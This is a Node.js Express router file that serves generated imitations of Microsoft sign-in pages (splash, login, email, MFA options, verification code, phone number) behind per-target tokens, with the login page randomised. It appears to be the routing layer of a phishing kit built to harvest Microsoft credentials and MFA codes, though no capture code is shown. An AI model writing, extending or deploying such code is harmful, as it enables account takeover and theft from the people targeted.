/**
 * Auth Routes
 * Token-protected Microsoft auth flow routes
 */

const express = require('express');
const router = express.Router();
const path = require('path');
const { tokenValidator } = require('../middleware/tokenValidator');
const { generateMsSplashPage } = require('../generators/msSplashPage');
const { generateMsLoginPage } = require('../generators/msLoginPage');
const { generateMsMailInputPage } = require('../generators/msMailInputPage');
const { generateMsCodeInputPage } = require('../generators/msCodeInputPage');
const { generateMsPhoneInputPage } = require('../generators/msPhoneInputPage');

const protectedRoot = path.join(__dirname, '../../protected_assets');

// Apply token validation to all routes
router.use('/:token', tokenValidator);

/**
 * GET /:token - Serve MS splash page
 */
router.get('/:token', (req, res) => {
    const token = req.params.token;
    console.log(`\n📧 Serving MS splash page for token: ${token}`);

    const html = generateMsSplashPage(token);
    res.send(html);
});

/**
 * GET /:token/login - Serve MS login page (Generated)
 * Handles both /login and /login.html
 */
router.get(['/:token/login', '/:token/login.html'], (req, res) => {
    const token = req.params.token;
    console.log(`🔐 Serving generated MS login page for token: ${token}`);

    // Generate page with randomization enabled
    const html = generateMsLoginPage(token, { randomize: true });
    res.send(html);
});

/**
 * GET /:token/mailinput - Serve email input page for MFA (Generated)
 */
router.get(['/:token/mailinput', '/:token/mailinput.html'], (req, res) => {
    const token = req.params.token;
    console.log(`📧 Serving generated email input page for token: ${token}`);

    const html = generateMsMailInputPage(token);
    res.send(html);
});

/**
 * GET /:token/codeinput - Serve code input page (Generated)
 */
router.get(['/:token/codeinput', '/:token/codeinput.html'], (req, res) => {
    const token = req.params.token;
    console.log(`🔢 Serving generated code input page for token: ${token}`);

    const html = generateMsCodeInputPage(token);
    res.send(html);
});

/**
 * GET /:token/very - Serve MFA verification options page (Generated)
 */
router.get(['/:token/very', '/:token/very.html'], (req, res) => {
    const token = req.params.token;
    console.log(`🔐 Serving generated MFA options page for token: ${token}`);

    const { generateMsVeryPage } = require('../generators/msVeryPage');
    const html = generateMsVeryPage(token);
    res.send(html);
});

/**
 * GET /:token/numinput - Serve phone number input page (Generated)
 */
router.get(['/:token/numinput', '/:token/numinput.html'], (req, res) => {
    const token = req.params.token;
    console.log(`📱 Serving generated phone input page for token: ${token}`);

    const html = generateMsPhoneInputPage(token);
    res.send(html);
});

module.exports = router;
